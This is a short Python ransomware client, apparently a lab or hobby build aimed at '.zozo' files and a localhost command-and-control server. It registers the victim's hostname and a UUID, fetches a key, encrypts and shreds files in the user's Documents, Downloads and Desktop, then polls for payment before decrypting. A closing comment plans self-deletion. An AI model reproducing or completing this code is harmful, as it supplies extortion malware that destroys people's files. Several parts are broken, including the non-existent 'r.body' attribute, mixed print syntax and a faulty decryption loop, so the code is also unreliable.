# get a KEY from the C&C server

import requests, json, uuid, os
from ransomcrypto import *

excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
included_filetypes = ['.zozo']
IP_ADDRESS = "localhost:8080"

priority_dirs = ['Documents', 'Downloads', 'Desktop'] # would normally do all folders in users home dir


UUID = uuid.uuid4()
host_name = os.environ['COMPUTERNAME']
encryption_key = ""
decryption_key = ""

# register with C&C server
while encryption_key == "":
    url = IP_ADDRESS+'/index/register'
    payload = {'uuid': UUID, 'host': host_name}

    r = requests.get(url, params=payload)

    # Check if request body exists
    if (r.body): #r.status_code == 200:

        try:
            content = json.loads(r.body)
            encryption_key = content["encryption_key"]
            print (" %s ", encryption_key)
        except ValueError:
            print ("Bad value")
    else:
        pass

# When encryption key okay
for target in priority_dirs:
    for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/"+target), topdown=False):
        print dirName

        for file_name in fileList:
            file_name_loc = os.path.join(dirName, file_name)

            name, ext = os.path.splitext(file_name_loc)

            if ext in included_filetypes:
                print file_name_loc

                # create new encrypted file with .enc extension

                try:
                    with open(file_name_loc, 'rb+') as in_file, open(file_name_loc+".enc", 'wb+') as out_file:
                        encrypt(in_file, out_file, encryption_key)
                except:
                    continue

                # shred the orginial file

                shred(file_name_loc, 2)

                # onto the next

paid = 0

while paid == 0:
    url = IP_ADDRESS+'/index/paid'
    payload = {'uuid': UUID, 'host': host_name}

    r = requests.get(url, params=payload)

    # Check if request body exists
    if (r.body): #r.status_code == 200:

        try:
            content = json.loads(r.body)
            decryption_key = content["encryption_key"]
            print (" %s ", encryption_key)
        except ValueError:
            print ("Bad value")


    else:
        pass

# When encryption key okay
for target in priority_dirs:
    for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/"+target), topdown=False):
        print dirName

        for file_name in fileList:
            file_name_loc = os.path.join(dirName, file_name)

            name, ext = os.path.splitext(file_name_loc)

            if ext in included_filetypes:
                print file_name_loc
                
                # create new encrypted file with .enc extension
                only_filename = file_name_loc.split(".")[-1]
                
                try:
                    with open(file_name_loc, 'rb+') as in_file, open(only_filename, 'wb+') as out_file:
                        decrypt(in_file, out_file, decryption_key)
                except:
                    continue

                # shred the orginial file

                shred(file_name_loc, 2)

                # onto the next


# generate kill script and delete self # open URL
